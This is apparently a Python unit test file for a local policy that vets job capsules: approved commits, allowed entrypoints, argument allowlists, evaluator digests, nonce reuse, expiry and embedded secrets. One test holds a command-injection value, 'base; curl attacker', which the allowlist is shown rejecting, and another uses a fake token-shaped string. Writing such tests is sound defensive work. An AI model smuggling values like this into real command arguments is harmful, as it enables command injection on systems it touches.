from __future__ import annotations

import unittest
from datetime import datetime, timedelta, timezone

from squeeze.capsule import JobCapsule
from squeeze.policy import LocalPolicy

NOW = datetime(2026, 7, 21, 20, 0, tzinfo=timezone.utc)
COMMIT = "a" * 40


def capsule(**changes: object) -> JobCapsule:
    raw: dict[str, object] = {
        "schema": "squeeze-job-v1",
        "repository": "Pokitomas/theawesomehexapp",
        "source_commit": COMMIT,
        "entrypoint": "foundry/archie-protocol/latent_world_benchmark/research/efficient_terminal_training.py",
        "entrypoint_sha256": "b" * 64,
        "arguments": ["--scale", "base"],
        "environment_profile": "archie-cuda-v1",
        "required_evaluator_sha256": "c" * 64,
        "output_contract": "terminal-efficiency-v3",
        "promotion": "research-only-not-admitted",
        "expires_at": (NOW + timedelta(hours=2)).isoformat(),
        "nonce": "job-12345678",
    }
    raw.update(changes)
    return JobCapsule.from_mapping(raw)


class PolicyTests(unittest.TestCase):
    def setUp(self) -> None:
        self.policy = LocalPolicy(approved_commits=frozenset({COMMIT}))

    def codes(self, value: JobCapsule) -> set[str]:
        return {item.code for item in self.policy.verify(value, now=NOW).violations}

    def test_valid_capsule_is_accepted(self) -> None:
        self.assertTrue(self.policy.verify(capsule(), now=NOW).accepted)

    def test_unapproved_commit_is_rejected(self) -> None:
        self.assertIn("approval", self.codes(capsule(source_commit="d" * 40)))

    def test_unknown_entrypoint_is_rejected(self) -> None:
        self.assertIn("entrypoint", self.codes(capsule(entrypoint="scripts/pwn.py")))

    def test_shell_payload_is_rejected_by_argument_allowlist(self) -> None:
        self.assertIn("arguments", self.codes(capsule(arguments=["--scale", "base; curl attacker"])))

    def test_changed_evaluator_digest_is_malformed(self) -> None:
        self.assertIn("evaluator_digest", self.codes(capsule(required_evaluator_sha256="not-a-digest")))

    def test_promotion_claim_is_rejected(self) -> None:
        self.assertIn("promotion", self.codes(capsule(promotion="admitted")))

    def test_reused_nonce_is_rejected(self) -> None:
        policy = LocalPolicy(approved_commits=frozenset({COMMIT}), used_nonces=frozenset({"job-12345678"}))
        self.assertIn("nonce_reuse", {v.code for v in policy.verify(capsule(), now=NOW).violations})

    def test_expired_capsule_is_rejected(self) -> None:
        value = capsule(expires_at=(NOW - timedelta(seconds=1)).isoformat())
        self.assertIn("expired", self.codes(value))

    def test_embedded_secret_is_rejected(self) -> None:
        self.assertIn("embedded_secret", self.codes(capsule(nonce="ghp_abcdefghijklmnopqrstuvwxyz123456")))


if __name__ == "__main__":
    unittest.main()
